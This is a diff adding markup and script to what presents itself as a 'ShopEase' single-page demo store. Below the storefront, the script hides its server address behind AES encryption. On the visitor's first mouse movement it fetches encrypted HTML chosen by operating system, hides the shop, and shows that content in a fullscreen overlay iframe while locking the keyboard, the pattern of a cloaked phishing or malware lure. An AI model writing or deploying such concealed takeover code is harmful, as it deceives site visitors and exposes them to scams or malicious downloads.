+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
+      </div>
+    </section>
+
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
+
+
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
+
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX19PP9rw5bqnzSMZaqZhEB/iwqE0KjDEy6hSKaB+5VK5z6gGn4EjFVR7";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
+
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
+
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
